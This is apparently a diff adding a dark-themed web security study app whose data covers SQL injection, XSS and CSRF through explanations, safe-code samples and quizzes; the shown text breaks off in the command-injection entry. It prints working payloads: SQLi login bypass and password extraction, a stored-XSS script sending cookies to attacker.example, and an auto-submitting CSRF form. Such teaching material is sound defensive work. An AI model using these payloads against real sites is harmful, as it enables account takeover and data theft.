@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="color-scheme" content="dark">
+<title>WebSec Reference</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { height: 100%; scroll-behavior: smooth; color-scheme: dark; }
+:root {
+  --black:#060608; --bg:#0d1017; --surface:#131720; --lift:#1a2030;
+  --border:#1f2937; --border2:#2d3748; --muted:#4b5563; --dim:#6b7280;
+  --body:#9ca3af; --text:#e5e7eb; --white:#f0f4f8;
+  --green:#00ff88; --green2:#00cc6a; --red:#ff4d4d; --orange:#ff9500;
+  --yellow:#ffd60a; --blue:#3b9eff; --purple:#a855f7;
+  --mono:'IBM Plex Mono',ui-monospace,Menlo,Consolas,monospace;
+  --sans:'Inter',system-ui,-apple-system,'Segoe UI',sans-serif;
+  --radius:4px;
+}
+body {
+  font-family:var(--sans); background:var(--black); color:var(--text);
+  height:100%; overflow:hidden; display:flex; flex-direction:column;
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+#topbar {
+  flex-shrink:0; min-height:48px; background:var(--bg); border-bottom:1px solid var(--border);
+  display:flex; align-items:center; padding:6px 16px; gap:12px; z-index:50; flex-wrap:wrap;
+}
+.wordmark { font-family:var(--mono); font-size:13px; font-weight:600; color:var(--green); white-space:nowrap; }
+.wordmark span { color:var(--dim); }
+.search-box { flex:1; min-width:160px; max-width:400px; position:relative; }
+.search-box input {
+  width:100%; height:32px; background:var(--surface); border:1px solid var(--border);
+  border-radius:var(--radius); color:var(--text); font-family:var(--mono); font-size:12px;
+  padding:0 12px 0 30px; outline:none; transition:border-color .15s;
+}
+.search-box input:focus { border-color:var(--green); }
+.search-box input::placeholder { color:var(--muted); }
+.search-icon { position:absolute; left:10px; top:50%; transform:translateY(-50%); color:var(--muted); font-size:13px; pointer-events:none; }
+#search-drop {
+  display:none; position:absolute; top:calc(100% + 4px); left:0; right:0; background:var(--surface);
+  border:1px solid var(--border); border-radius:var(--radius); z-index:200; overflow:hidden;
+  box-shadow:0 8px 32px rgba(0,0,0,.5);
+}
+#search-drop.open { display:block; }
+.sdrop-item { display:flex; align-items:center; gap:10px; padding:9px 12px; cursor:pointer; border-bottom:1px solid var(--border); }
+.sdrop-item:last-child { border-bottom:none; }
+.sdrop-item:hover { background:var(--lift); }
+.si-icon { font-size:16px; flex-shrink:0; }
+.si-name { font-family:var(--mono); font-size:12px; color:var(--text); }
+.si-desc { font-size:11px; color:var(--dim); }
+.top-actions { margin-left:auto; display:flex; gap:6px; flex-wrap:wrap; }
+.chip {
+  font-family:var(--mono); font-size:11px; padding:4px 10px; border-radius:2px;
+  border:1px solid var(--border); background:none; color:var(--dim); cursor:pointer; transition:all .15s;
+}
+.chip:hover { border-color:var(--border2); color:var(--text); }
+.chip.active { border-color:var(--green); color:var(--green); background:rgba(0,255,136,.06); }
+
+#shell { flex:1; display:flex; overflow:hidden; min-height:0; }
+#sidebar { width:236px; flex-shrink:0; background:var(--bg); border-right:1px solid var(--border); overflow-y:auto; overflow-x:hidden; }
+#sidebar::-webkit-scrollbar, #main::-webkit-scrollbar { width:6px; }
+#sidebar::-webkit-scrollbar-thumb, #main::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+.sb-section { padding:14px 0 4px; }
+.sb-label { font-family:var(--mono); font-size:10px; color:var(--muted); padding:0 14px 6px; display:block; letter-spacing:.5px; text-transform:lowercase; }
+.sb-item {
+  display:flex; align-items:center; gap:9px; padding:7px 14px; cursor:pointer; border:none; background:none;
+  width:100%; text-align:left; color:var(--body); font-family:var(--sans); font-size:13px;
+  border-left:2px solid transparent; transition:all .12s;
+}
+.sb-item:hover { background:var(--surface); color:var(--text); }
+.sb-item.active { background:var(--surface); color:var(--text); border-left-color:var(--green); }
+.sb-item .si { font-size:15px; flex-shrink:0; }
+.sb-item .sname { flex:1; line-height:1.3; }
+.sb-sev { font-family:var(--mono); font-size:9px; padding:1px 5px; border-radius:2px; flex-shrink:0; }
+.sev-critical { background:rgba(255,77,77,.15); color:#ff6b6b; }
+.sev-high { background:rgba(255,149,0,.15); color:#ff9500; }
+.sev-medium { background:rgba(255,214,10,.15); color:#ffd60a; }
+
+#main { flex:1; overflow-y:auto; overflow-x:hidden; background:var(--black); min-width:0; }
+#index-view { padding:24px 28px; }
+#index-view.off { display:none; }
+.index-header h1 { font-family:var(--mono); font-size:22px; font-weight:600; color:var(--white); margin-bottom:8px; }
+.index-header h1 span { color:var(--green); }
+.index-header p { font-size:14px; color:var(--dim); max-width:560px; line-height:1.6; }
+.index-meta { display:flex; gap:24px; margin:16px 0 24px; flex-wrap:wrap; }
+.imeta-item { display:flex; align-items:center; gap:8px; }
+.imeta-item .num { font-family:var(--mono); font-size:20px; font-weight:600; color:var(--green); }
+.imeta-item .lbl { font-size:12px; color:var(--dim); }
+.topic-table { width:100%; border-collapse:collapse; }
+.topic-table thead th { font-family:var(--mono); font-size:10px; color:var(--muted); font-weight:500; text-align:left; padding:8px 12px; border-bottom:1px solid var(--border); }
+.topic-table tbody tr { border-bottom:1px solid var(--border); cursor:pointer; transition:background .1s; }
+.topic-table tbody tr:hover { background:var(--surface); }
+.topic-table td { padding:13px 12px; font-size:13px; vertical-align:middle; }
+.tt-icon { font-size:20px; text-align:center; width:44px; }
+.tt-name { font-weight:600; color:var(--text); display:block; margin-bottom:3px; }
+.tt-desc { font-size:12px; color:var(--dim); line-height:1.4; }
+.tt-tags { display:flex; gap:5px; flex-wrap:wrap; }
+.tag-pill { font-family:var(--mono); font-size:10px; padding:2px 7px; border-radius:2px; background:var(--lift); color:var(--dim); border:1px solid var(--border); }
+.tt-arrow { color:var(--muted); font-size:16px; text-align:center; }
+
+#detail-view { display:none; }
+#detail-view.on { display:block; }
+.det-head { background:var(--bg); border-bottom:1px solid var(--border); padding:20px 28px; display:flex; align-items:flex-start; gap:16px; flex-wrap:wrap; }
+.det-icon-wrap { width:48px; height:48px; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); display:flex; align-items:center; justify-content:center; font-size:24px; flex-shrink:0; }
+.det-meta { flex:1; min-width:240px; }
+.det-meta h1 { font-family:var(--mono); font-size:18px; font-weight:600; color:var(--white); margin-bottom:6px; }
+.ddesc { font-size:13px; color:var(--body); line-height:1.6; max-width:680px; }
+.det-badges { display:flex; gap:8px; margin-top:10px; flex-wrap:wrap; }
+.badge { font-family:var(--mono); font-size:10px; padding:3px 9px; border-radius:2px; border:1px solid transparent; }
+.back-btn { font-family:var(--mono); font-size:11px; color:var(--dim); background:none; border:1px solid var(--border); border-radius:var(--radius); padding:6px 12px; cursor:pointer; white-space:nowrap; margin-top:3px; }
+.back-btn:hover { color:var(--text); border-color:var(--border2); }
+.tab-bar { display:flex; background:var(--bg); border-bottom:1px solid var(--border); overflow-x:auto; scrollbar-width:none; padding:0 20px; }
+.tab-bar::-webkit-scrollbar { display:none; }
+.tab-btn { font-family:var(--mono); font-size:12px; padding:12px 16px; border:none; background:none; color:var(--dim); cursor:pointer; border-bottom:2px solid transparent; margin-bottom:-1px; white-space:nowrap; }
+.tab-btn:hover { color:var(--text); }
+.tab-btn.on { color:var(--green); border-bottom-color:var(--green); }
+.tab-pane { padding:24px 28px 60px; }
+.sec-title { font-family:var(--mono); font-size:13px; font-weight:600; color:var(--white); margin-bottom:14px; padding-bottom:8px; border-bottom:1px solid var(--border); }
+.prose-p { font-size:14px; color:var(--body); line-height:1.75; margin-bottom:14px; max-width:700px; }
+.prose-p a, .callout a { color:var(--blue); text-decoration:none; }
+.flow-wrap { background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); padding:16px 20px; margin:16px 0; overflow-x:auto; }
+.flow-title { font-family:var(--mono); font-size:10px; color:var(--muted); margin-bottom:12px; letter-spacing:.5px; }
+.flow-nodes { display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
+.fn { font-family:var(--mono); font-size:11px; padding:6px 12px; border-radius:3px; border:1px solid; white-space:nowrap; }
+.fn-arrow { color:var(--muted); font-size:16px; }
+.fn-a { background:rgba(255,77,77,.1); color:#ff9090; border-color:rgba(255,77,77,.3); }
+.fn-v { background:rgba(255,149,0,.1); color:#ffaa44; border-color:rgba(255,149,0,.3); }
+.fn-x { background:rgba(255,214,10,.1); color:#ffd60a; border-color:rgba(255,214,10,.3); }
+.fn-s { background:rgba(59,158,255,.1); color:#7ab8ff; border-color:rgba(59,158,255,.3); }
+.fn-i { background:rgba(255,77,77,.1); color:#ff9090; border-color:rgba(255,77,77,.3); }
+.fn-db { background:rgba(168,85,247,.1); color:#c084fc; border-color:rgba(168,85,247,.3); }
+.callout { display:flex; gap:12px; align-items:flex-start; padding:12px 16px; border-radius:var(--radius); font-size:13px; line-height:1.6; margin:14px 0; max-width:720px; }
+.callout-warn { background:rgba(255,149,0,.07); border:1px solid rgba(255,149,0,.25); color:#ffaa44; }
+.callout-tip { background:rgba(0,255,136,.05); border:1px solid rgba(0,255,136,.2); color:#00cc6a; }
+.callout-info { background:rgba(59,158,255,.07); border:1px solid rgba(59,158,255,.25); color:#7ab8ff; }
+.callout-red { background:rgba(255,77,77,.07); border:1px solid rgba(255,77,77,.25); color:#ff9090; }
+.callout-icon { flex-shrink:0; font-weight:700; }
+.ex-block { margin-bottom:26px; }
+.ex-title { font-family:var(--mono); font-size:12px; font-weight:600; color:var(--text); margin-bottom:8px; }
+.code-wrap { max-width:820px; }
+.code-header { display:flex; align-items:center; justify-content:space-between; background:var(--lift); border:1px solid var(--border); border-bottom:none; border-radius:var(--radius) var(--radius) 0 0; padding:7px 14px; }
+.code-lang { font-family:var(--mono); font-size:10px; color:var(--muted); }
+.code-label-good { color:var(--green); }
+.code-label-atk { color:var(--orange); }
+.copy-code-btn { font-family:var(--mono); font-size:10px; background:none; border:none; color:var(--muted); cursor:pointer; padding:2px 6px; }
+.copy-code-btn:hover { color:var(--text); }
+.code-body { background:#090d13; border:1px solid var(--border); border-radius:0 0 var(--radius) var(--radius); overflow-x:auto; padding:14px 16px; }
+.code-body pre { font-family:var(--mono); font-size:12px; line-height:1.7; color:#c9d1d9; white-space:pre; }
+.checklist { display:flex; flex-direction:column; gap:8px; margin:12px 0; max-width:700px; }
+.cl-item { display:flex; gap:10px; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); padding:10px 14px; font-size:13px; color:var(--body); line-height:1.5; }
+.cl-item .ci { color:var(--green); flex-shrink:0; }
+.types-list { display:flex; flex-direction:column; gap:8px; max-width:700px; }
+.type-row { padding:10px 14px; background:var(--surface); border:1px solid var(--border); border-left:3px solid; border-radius:0 var(--radius) var(--radius) 0; }
+.tr-name { color:var(--text); font-weight:500; font-size:13px; margin-bottom:2px; }
+.tr-desc { font-size:12px; color:var(--dim); line-height:1.5; }
+.quiz-wrap { max-width:680px; }
+.quiz-prog-bar-outer { height:3px; background:var(--surface); border-radius:2px; margin-bottom:20px; overflow:hidden; }
+.quiz-prog-bar-inner { height:100%; background:var(--green); transition:width .3s ease; }
+.quiz-scoreline { font-family:var(--mono); font-size:11px; color:var(--muted); margin-bottom:16px; }
+.quiz-q { font-size:15px; font-weight:600; color:var(--white); line-height:1.5; margin-bottom:18px; }
+.quiz-opts { display:flex; flex-direction:column; gap:8px; }
+.quiz-opt { padding:11px 15px; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); font-size:13px; color:var(--text); cursor:pointer; text-align:left; font-family:var(--sans); line-height:1.5; }
+.quiz-opt:hover:not(:disabled) { border-color:var(--border2); background:var(--lift); }
+.quiz-opt.correct { border-color:var(--green); background:rgba(0,255,136,.07); color:var(--green); }
+.quiz-opt.wrong { border-color:var(--red); background:rgba(255,77,77,.07); color:var(--red); }
+.quiz-opt:disabled { cursor:default; }
+.quiz-exp { margin-top:14px; padding:12px 14px; border-radius:var(--radius); font-size:13px; line-height:1.65; display:none; }
+.quiz-exp.show { display:block; }
+.quiz-exp.correct { background:rgba(0,255,136,.06); border:1px solid rgba(0,255,136,.2); color:#6ee7b7; }
+.quiz-exp.wrong { background:rgba(255,77,77,.06); border:1px solid rgba(255,77,77,.2); color:#fca5a5; }
+.quiz-footer { display:flex; justify-content:flex-end; margin-top:16px; min-height:36px; }
+.quiz-next-btn { font-family:var(--mono); font-size:12px; padding:8px 18px; background:var(--green); color:var(--black); border:none; border-radius:var(--radius); cursor:pointer; font-weight:600; display:none; }
+.quiz-next-btn.show { display:inline-block; }
+.quiz-end { text-align:center; padding:32px 20px; }
+.big-score { font-family:var(--mono); font-size:48px; font-weight:600; color:var(--white); line-height:1; margin-bottom:8px; }
+.score-sub { font-size:14px; color:var(--dim); margin-bottom:20px; }
+.retry-btn { font-family:var(--mono); font-size:12px; padding:9px 20px; background:none; border:1px solid var(--green); color:var(--green); border-radius:var(--radius); cursor:pointer; }
+.retry-btn:hover { background:rgba(0,255,136,.08); }
+.refs-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:10px; max-width:860px; }
+.ref-card { display:block; text-decoration:none; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); padding:13px 15px; }
+.ref-card:hover { border-color:var(--border2); }
+.ref-src { font-family:var(--mono); font-size:10px; color:var(--muted); margin-bottom:5px; }
+.ref-name { font-size:13px; color:var(--text); font-weight:500; line-height:1.4; margin-bottom:6px; }
+.ref-url { font-family:var(--mono); font-size:10px; color:var(--blue); }
+.divider { height:1px; background:var(--border); margin:20px 0; max-width:720px; }
+@media (max-width:760px) {
+  body { overflow:auto; height:auto; min-height:100%; }
+  #shell { flex-direction:column; overflow:visible; }
+  #main { overflow:visible; }
+  #sidebar { width:100%; display:flex; overflow-x:auto; border-right:none; border-bottom:1px solid var(--border); }
+  .sb-section { display:flex; padding:6px 0; }
+  .sb-label { display:none; }
+  .sb-item { white-space:nowrap; padding:7px 12px; border-left:none; border-bottom:2px solid transparent; width:auto; }
+  .sb-item.active { border-bottom-color:var(--green); }
+  .sb-sev { display:none; }
+  #index-view, .tab-pane, .det-head { padding-left:16px; padding-right:16px; }
+  .tt-tags, .topic-table th:nth-child(3) { display:none; }
+}
+</style>
+</head>
+<body>
+<div id="topbar">
+  <div class="wordmark">websec<span>/</span>ref</div>
+  <div class="search-box">
+    <span class="search-icon">&#8981;</span>
+    <input id="searchInp" type="text" placeholder="search topics, attacks, payloads..." autocomplete="off">
+    <div id="search-drop"></div>
+  </div>
+  <div class="top-actions">
+    <button class="chip" id="filter-all" onclick="setFilter('all')">All</button>
+    <button class="chip" id="filter-server" onclick="setFilter('server')">Server-side</button>
+    <button class="chip" id="filter-client" onclick="setFilter('client')">Client-side</button>
+    <button class="chip" id="filter-auth" onclick="setFilter('auth')">Auth &amp; Logic</button>
+  </div>
+</div>
+<div id="shell">
+  <nav id="sidebar"></nav>
+  <div id="main">
+    <div id="index-view">
+      <div class="index-header">
+        <h1><span>//</span> Web Security Reference</h1>
+        <p>Attack patterns, exploitation techniques and mitigations, based on PortSwigger Web Security Academy and OWASP.</p>
+        <div class="index-meta">
+          <div class="imeta-item"><span class="num" id="n-topics">14</span><span class="lbl">topics</span></div>
+          <div class="imeta-item"><span class="num" id="n-crit">5</span><span class="lbl">critical severity</span></div>
+          <div class="imeta-item"><span class="num" id="n-ex">40+</span><span class="lbl">code examples</span></div>
+          <div class="imeta-item"><span class="num" id="n-q">50+</span><span class="lbl">quiz questions</span></div>
+        </div>
+      </div>
+      <table class="topic-table">
+        <thead><tr><th></th><th>Vulnerability</th><th>Tags</th><th>Severity</th><th></th></tr></thead>
+        <tbody id="topic-tbody"></tbody>
+      </table>
+    </div>
+    <div id="detail-view">
+      <div class="det-head" id="det-head"></div>
+      <div class="tab-bar" id="tab-bar"></div>
+      <div id="tab-content"></div>
+    </div>
+  </div>
+</div>
+<script>
+const TOPICS = [
+{
+  id:'sqli', icon:'💉', name:'SQL Injection', group:'server',
+  short:'Interfere with database queries to read, modify, or delete data.',
+  severity:'critical', sevColor:'#ff4d4d',
+  tags:['Database','Auth bypass','UNION','Blind'],
+  desc:'SQLi lets attackers manipulate database queries by injecting SQL through unsanitized inputs. Impact ranges from data theft to full database control and server compromise.',
+  flow:[{t:"Attacker",c:'fn-a'},{t:"→"},{t:"' OR 1=1--",c:'fn-v'},{t:"→"},{t:"WHERE clause broken",c:'fn-x'},{t:"→"},{t:"DB returns all rows",c:'fn-db'},{t:"→"},{t:"Data exfiltrated",c:'fn-i'}],
+  howItWorks:"When an application builds SQL queries by string concatenation, user input becomes part of the query logic. A single quote can break out of the string context and inject arbitrary SQL, which the database executes with the application's privileges.",
+  types:[
+    {name:"In-band: UNION-based",desc:"UNION SELECT appends results from other tables to the original query's response.",c:'#ff4d4d'},
+    {name:"In-band: error-based",desc:"Forces database errors that leak schema info or data in the message.",c:'#ff6b6b'},
+    {name:"Blind: boolean",desc:"Asks true/false questions via injected conditions and infers data from response differences.",c:'#ff9500'},
+    {name:"Blind: time-based",desc:"Uses SLEEP()/WAITFOR DELAY to confirm injection when responses look identical.",c:'#ffd60a'},
+    {name:"Out-of-band",desc:"Exfiltrates data via DNS or HTTP requests to a server you control.",c:'#3b9eff'},
+    {name:"Second-order (stored)",desc:"A payload is stored safely, then triggered later when reused unsafely in another query.",c:'#a855f7'}
+  ],
+  examples:[
+    {title:"Retrieving hidden data",kind:"atk",lang:"SQL",code:`-- Normal query:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+-- Payload: Gifts'--
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+--                                                  ^ rest is a comment
+-- The released=1 check is gone, so unreleased products appear`},
+    {title:"Login bypass",kind:"atk",lang:"SQL",code:`-- Normal query:
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+-- Username: administrator'--   Password: (blank)
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+-- Password check is commented out: logged in as administrator`},
+    {title:"UNION attack",kind:"atk",lang:"SQL",code:`-- 1. Find the column count:
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   (error => the query has 2 columns)
+
+-- 2. Pull data from another table:
+' UNION SELECT username, password FROM users--
+
+-- Resulting query:
+SELECT name, description FROM products WHERE category = ''
+UNION SELECT username, password FROM users--'`},
+    {title:"Blind boolean extraction",kind:"atk",lang:"HTTP",code:`-- True condition (normal page):
+Cookie: TrackingId=abc' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
+-- False condition (page differs):
+Cookie: TrackingId=abc' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='b'--
+-- Repeat per character position; automate with Burp Intruder`},
+    {title:"Vulnerable vs safe",kind:"good",lang:"Java",code:`// VULNERABLE: string concatenation
+String q = "SELECT * FROM products WHERE category = '" + input + "'";
+Statement s = connection.createStatement();
+ResultSet rs = s.executeQuery(q);
+
+// SAFE: parameterized query
+PreparedStatement ps = connection.prepareStatement(
+    "SELECT * FROM products WHERE category = ?");
+ps.setString(1, input);   // input is data, never SQL
+ResultSet rs2 = ps.executeQuery();`}
+  ],
+  prevention:["Use parameterized queries (prepared statements) for every query that includes input","Use a well-tested ORM, but don't concatenate strings inside it either","Whitelist permitted values where parameters can't be used (column names, ORDER BY)","Give database accounts least privilege (read-only where possible)","The query string must always be a hard-coded constant, never built from variable data"],
+  quiz:[
+    {q:"Which character is the classic first test for SQL injection?",opts:["#",";","'","*"],ans:2,exp:"A single quote breaks out of a SQL string literal. A database error or odd behaviour suggests the input reaches a query unsafely."},
+    {q:"What does -- do in a SQLi payload?",opts:["Selects all columns","Comments out the rest of the query","Deletes records","Escapes quotes"],ans:1,exp:"-- starts a SQL comment, so everything after it is ignored. That strips conditions such as AND password='...' or AND released = 1."},
+    {q:"A UNION attack requires the injected SELECT to match the original query's...",opts:["Table name","WHERE clause","Number and compatible types of columns","Database version"],ans:2,exp:"Both SELECTs in a UNION must return the same number of columns with compatible data types, otherwise the database errors."},
+    {q:"Second-order SQL injection fires when...",opts:["The page first loads","Stored data is later used unsafely in another query","The session expires","A second tab opens"],ans:1,exp:"The payload is stored safely, but later retrieved and concatenated into a different query because the developer wrongly trusted data that came from the database."},
+    {q:"What is the strongest defense against SQL injection?",opts:["Blacklisting SQL keywords","HTML-encoding output","Parameterized queries","Hiding error messages"],ans:2,exp:"Parameterized queries keep code and data separate, so input can never change the query structure."}
+  ],
+  refs:[
+    {src:"OWASP",name:"SQL Injection Prevention Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"},
+    {src:"PortSwigger",name:"SQL Injection Cheat Sheet",url:"https://portswigger.net/web-security/sql-injection/cheat-sheet"},
+    {src:"MITRE",name:"CWE-89: SQL Injection",url:"https://cwe.mitre.org/data/definitions/89.html"}
+  ]
+},
+{
+  id:'xss', icon:'🎭', name:'Cross-Site Scripting (XSS)', group:'client',
+  short:"Inject scripts that run in other users' browsers.",
+  severity:'high', sevColor:'#ff9500',
+  tags:['Client-side','Script injection','Session theft','DOM'],
+  desc:"XSS lets attackers get malicious JavaScript executed in a victim's browser within the vulnerable site's origin, enabling session hijacking, credential theft and acting as the user.",
+  flow:[{t:"Attacker",c:'fn-a'},{t:"→"},{t:"<script> payload",c:'fn-v'},{t:"→"},{t:"Stored or reflected",c:'fn-x'},{t:"→"},{t:"Victim loads page",c:'fn-s'},{t:"→"},{t:"Script runs as victim",c:'fn-i'}],
+  howItWorks:"Browsers trust everything served from an origin. When an app reflects or stores attacker-controlled input as HTML without encoding it, the browser parses it as markup and runs any script in the victim's session, with access to the page, cookies and tokens.",
+  types:[
+    {name:"Reflected XSS",desc:"The payload comes from the current HTTP request (URL parameter, form field). The victim must be lured to a crafted URL.",c:'#ff4d4d'},
+    {name:"Stored XSS",desc:"The payload is saved (comment, profile, message) and served to everyone who views it. Highest impact.",c:'#ff6b6b'},
+    {name:"DOM-based XSS",desc:"Client-side JavaScript passes a source (location.hash, document.referrer) into a sink (innerHTML, eval) unsafely.",c:'#ff9500'}
+  ],
+  examples:[
+    {title:"Reflected XSS",kind:"atk",lang:"HTTP",code:`GET /status?message=<script>alert(document.domain)<\/script>
+
+<\!-- Response -->
+<p>Status: <script>alert(document.domain)<\/script></p>
+<\!-- The browser runs it in the victim's session -->`},
+    {title:"Stored XSS",kind:"atk",lang:"HTML",code:`<\!-- Attacker posts this as a comment -->
+<p><script>
+  fetch('https://attacker.example/log?c=' + document.cookie)
+<\/script></p>
+
+<\!-- Every visitor's browser runs it.
+     HttpOnly cookies block document.cookie, but the script can
+     still act as the user (change email, post, transfer). -->`},
+    {title:"DOM XSS",kind:"atk",lang:"JavaScript",code:`// Vulnerable client-side code:
+var search = location.search.slice(1);
+document.getElementById('results').innerHTML = 'You searched for: ' + search;
+
+// Attack URL:
+// https://site.example/?<img src=1 onerror=alert(1)>
+// innerHTML parses the HTML, onerror fires`},
+    {title:"Safe output handling",kind:"good",lang:"JavaScript",code:`// VULNERABLE
+el.innerHTML = userInput;
+
+// SAFE: textContent never parses HTML
+el.textContent = userInput;
+
+// Server side: HTML-encode on output (< > & " ')
+// Last line of defense: a strict Content Security Policy
+// Content-Security-Policy: default-src 'self'; script-src 'self'`}
+  ],
+  prevention:["Encode data on output for the context it lands in (HTML, attribute, JS, URL)","Filter input on arrival, as strictly as the expected format allows","Use textContent / safe DOM APIs instead of innerHTML, document.write, eval","Set a Content Security Policy as defense in depth","Mark session cookies HttpOnly and use correct Content-Type / X-Content-Type-Options headers"],
+  quiz:[
+    {q:"Which XSS type persists on the server and hits every visitor?",opts:["Reflected","DOM-based","Stored","Self-XSS"],ans:2,exp:"Stored XSS is saved by the application and delivered to every user who views the affected content, with no crafted link needed."},
+    {q:"HttpOnly on a cookie protects against...",opts:["CSRF","JavaScript reading the cookie","Network sniffing","Clickjacking"],ans:1,exp:"HttpOnly hides the cookie from document.cookie, so XSS can't read the session token directly, though it can still perform actions as the user."},
+    {q:"DOM-based XSS happens when...",opts:["The server reflects input","Client-side JS moves attacker data from a source to a dangerous sink","A database stores the payload","CORS is misconfigured"],ans:1,exp:"The flaw is in client-side code: a source like location.hash flows into a sink like innerHTML without sanitization."},
+    {q:"Which HTML entity stops < being parsed as a tag?",opts:["&amp;","&lt;","&gt;","&quot;"],ans:1,exp:"&lt; renders a literal < character instead of starting an element."}
+  ],
+  refs:[
+    {src:"OWASP",name:"XSS Prevention Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"},
+    {src:"MDN",name:"Content Security Policy",url:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"},
+    {src:"PortSwigger",name:"XSS Cheat Sheet",url:"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"}
+  ]
+},
+{
+  id:'csrf', icon:'🪝', name:'Cross-Site Request Forgery', group:'client',
+  short:'Trick logged-in users into performing actions they did not intend.',
+  severity:'high', sevColor:'#ff9500',
+  tags:['Session abuse','State change','SameSite','Tokens'],
+  desc:"CSRF abuses the browser's automatic sending of cookies. An attacker's page triggers a request to a site where the victim is logged in, and the site treats it as legitimate.",
+  flow:[{t:"Attacker page",c:'fn-a'},{t:"→"},{t:"Hidden form auto-submits",c:'fn-v'},{t:"→"},{t:"Browser adds victim's cookie",c:'fn-x'},{t:"→"},{t:"Server accepts request",c:'fn-s'},{t:"→"},{t:"Account changed",c:'fn-i'}],
+  howItWorks:"Three conditions are needed: (1) a relevant action, (2) session handling based only on cookies, and (3) no unpredictable request parameters. If all hold, an attacker can build a page that makes the victim's browser send the request with their session attached.",
+  types:[
+    {name:"POST-based CSRF",desc:"A hidden auto-submitting form sends the state-changing request.",c:'#ff6b6b'},
+    {name:"GET-based CSRF",desc:"An <img> tag or link is enough when the action accepts GET.",c:'#ff9500'},
+    {name:"Token bypasses",desc:"Token not validated, tied to wrong session, or only checked when present.",c:'#ffd60a'},
+    {name:"SameSite bypasses",desc:"Lax cookies can be sent on top-level GET navigations; method override and sibling-domain gadgets can help.",c:'#a855f7'},
+    {name:"Referer-based defenses",desc:"Weak when validation is skipped if the header is missing or loosely matched.",c:'#3b9eff'}
+  ],
+  examples:[
+    {title:"Classic CSRF exploit",kind:"atk",lang:"HTML",code:`<\!-- Hosted on the attacker's site -->
+<form action="https://vulnerable-website.com/email/change" method="POST">
+  <input type="hidden" name="email" value="pwned@evil-user.net">
+</form>
+<script>document.forms[0].submit();<\/script>
+
+<\!-- Victim visits the page, their browser sends the request with
+     their session cookie, and the email is changed.
+     Next step for the attacker: password reset. -->`},
+    {title:"GET-based variant",kind:"atk",lang:"HTML",code:`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`},
+    {title:"Defenses",kind:"good",lang:"HTTP",code:`<\!-- Unpredictable per-session token in the form -->
+<input type="hidden" name="csrf" value="Ax9mK2p7vNqR...">
+
+# Cookie hardening
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+
+# The attacker's page can't read the token (same-origin policy),
+# so it can't forge a valid request.`}
+  ],
+  prevention:["Use CSRF tokens: unpredictable, tied to the session, validated on every state-changing request","Set SameSite=Strict (or Lax) on session cookies","Never perform state changes on GET requests","Validate Origin/Referer as additional defense, never as the only one","Require re-authentication for high-risk actions"],
+  quiz:[
+    {q:"Which three conditions enable CSRF?",opts:["XSS, CORS, cookies","Relevant action, cookie-only session handling, predictable parameters","POST, forms, JavaScript","Admin role, HTTPS, GET"],ans:1,exp:"The attacker needs an action worth triggering, a session tracked only via cookies, and request parameters they can determine in advance."},
+    {q:"SameSite=Strict means the cookie is...",opts:["HTTPS only","Never sent on cross-site requests","Hidden from JavaScript","Encrypted"],ans:1,exp:"With Strict, browsers withhold the cookie on any request initiated from another site, which blocks classic CSRF."},
+    {q:"Why can't an attacker simply include a valid CSRF token?",opts:["Tokens are encrypted","The same-origin policy stops them reading it from the victim's page","Tokens expire in seconds","Tokens are IP-bound"],ans:1,exp:"The token is only visible in responses to the victim's own browser; cross-origin pages cannot read those responses."},
+    {q:"How does CSRF differ from XSS?",opts:["They are identical","CSRF forges requests using the victim's session; XSS runs attacker code in the victim's browser","XSS needs no user interaction; CSRF does","CSRF is server-side"],ans:1,exp:"CSRF induces actions via forged requests; XSS executes attacker-controlled script and can do far more, including defeating CSRF tokens."}
+  ],
+  refs:[
+    {src:"OWASP",name:"CSRF Prevention Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"},
+    {src:"MDN",name:"SameSite cookies",url:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute"}
+  ]
+},
+{
+  id:'cmdi', icon:'💻', name:'OS Command Injection', group:'server',
+  short:'Execute arbitrary operating system commands on the server.',
+  severity:'critical', sevColor:'#ff4d4d',
+  tags:['RCE','Shell','Blind','OAST'],
+  desc:'OS command injection (shell injection) lets an attacker run operating system commands on the server hosting the application, often leading to full compromise and pivoting into internal systems.',
+  flow:[{t:"User input",c:'fn-a'},{t:"→"},{t:"& whoami & appended",c:'fn-v'},{t:"→"},{t:"Shell runs 3 commands",c:'fn-x'},{t:"→"},{t:"Output returned",c:'fn-i'}],
+  howItWorks:"Some apps call out to shell commands (mail, stock lookups, file tools) and pass user values as arguments. If those values are concatenated into the command string, shell metacharacters such as &, ;, | and backticks let an attacker append their own commands.",
+  types:[
